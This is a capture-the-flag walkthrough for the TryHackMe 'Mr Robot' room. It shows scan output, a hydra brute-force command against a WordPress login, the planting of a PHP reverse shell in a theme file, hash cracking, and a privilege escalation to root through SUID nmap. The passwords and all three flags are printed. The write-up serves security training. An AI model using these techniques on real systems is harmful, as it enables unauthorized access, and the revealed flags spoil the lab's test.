###### Based on the Mr. Robot show, can you root this box?
Room: https://tryhackme.com/room/mrrobot
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xxx.xxx  
```
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 63
80/tcp  open   http     syn-ack ttl 63 Apache httpd
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd
```

**gobuster dir** http://xx.xx.xxx.xxx --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 
```
/images               (Status: 301) [Size: 236] [--> http://xx.xx.xxx.xxx/images/]
/blog                 (Status: 301) [Size: 234] [--> http://xx.xx.xxx.xxx/blog/]  
/sitemap              (Status: 200) [Size: 0]                                     
/login                (Status: 302) [Size: 0] [--> http://xx.xx.xxx.xxx/wp-login.php]
/rss                  (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/feed/]       
/video                (Status: 301) [Size: 235] [--> http://xx.xx.xxx.xxx/video/]    
/0                    (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/feed/]       
/wp-content           (Status: 301) [Size: 240] [--> http://xx.xx.xxx.xxx/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://xx.xx.xxx.xxx/admin/]     
/atom                 (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/feed/atom/]   
/image                (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/image/]       
/audio                (Status: 301) [Size: 235] [--> http://xx.xx.xxx.xxx/audio/]     
/intro                (Status: 200) [Size: 516314]                                    
/css                  (Status: 301) [Size: 233] [--> http://xx.xx.xxx.xxx/css/]       
/wp-login             (Status: 200) [Size: 2613]                                      
/rss2                 (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/feed/]        
/license              (Status: 200) [Size: 309]                                       
/wp-includes          (Status: 301) [Size: 241] [--> http://xx.xx.xxx.xxx/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://xx.xx.xxx.xxx/js/]         
/Image                (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/Image/]        
/rdf                  (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/feed/rdf/]     
/page1                (Status: 301) [Size: 0] [--> http://xx.xx.xxx.xxx/]              
/readme               (Status: 200) [Size: 64]                                         
/robots               (Status: 200) [Size: 41]                        

```

However, most of these are forbidden to access.  

* xx.xx.xxx.xxx/wp-login 
* xx.xx.xxx.xxx/robots.txt

Are the directories that matter to us.  

At **robots.txt** we can find a password list called **fsocity.dic** we can download using wget http://xx.xx.xxx.xxx//fsocity.dic  
**Note**: It's _fsocity_ and NOT _fsociety_.  

**The first flag is at xx.xx.xxx.xxx/key-1-of-3.txt and is 073403c8a58a1f80d943455fb30724b9** **[1]**.  

After some more looking around, I decided that we have enough to start bruteforcing the Wordpress Login since I couldn't find anything else useful enough.  
**hydra** -l Elliot -P fsocity.dic xx.xx.xxx.xxx http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

The password happens to be **ER28-0652**.

Once we're logged in Elliot's account, we can go and change one of the .php's pages source code with a PHP reverse shell.  
I edited the 404.php page of twentyfifteen's theme and replaced the source code with a PHP reverse shell.  

I got a reverse shell under the **daemon** "user".  
However, it was easy to escalate privileges since in /home/robot there was a raw MD5 hash that I could crack using john the ripper.  
> abcdefghijklmnopqrstuvwxyz

After we're under **robot** user, we can read the **flag-2-of-3.txt** file.  

**Second flag is at /home/robot/key-2-of-3.txt and is 822c73956184f694993bede3eb39f959** **[2]**.  

To escalate privileges, I first took a look at what I can execute by running
**find** / perm +6000 2>/dev/null | grep "/bin/"

I used the **nmap** located at /usr/local/bin/nmap to escalate my privileges to root.
**nmap --interactive**
nmap> **!sh**

```
# whoami
whoami
root
```

**The third and final flag is at /root/key-3-of-3.txt and is 04787ddef27c3dee1ee161b21670b4e4** **[3]**. 
